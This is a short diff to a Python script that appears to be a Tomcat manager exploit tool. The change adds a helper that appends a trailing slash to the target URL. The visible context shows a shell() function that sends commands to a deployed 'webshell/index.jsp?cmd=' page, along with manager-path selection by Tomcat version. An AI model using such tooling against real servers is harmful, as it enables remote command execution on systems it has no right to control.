@@ -5,6 +5,14 @@ from bs4 import BeautifulSoup
 import time
 import argparse
 
+def check_url(url): 
+    check = url[-1] 
+    if check == "/": 
+        return url
+    else:
+        url = url + "/"
+        return url
+
 def shell(url):
     url = url + "webshell/index.jsp?cmd="
     while True:
@@ -81,6 +89,9 @@ def main():
     user = args.u
     password = args.p
     ver = args.version
+
+    url = check_url(url)   
+
     if ver >= '7': 
         path = '/manager/text/'
     else:
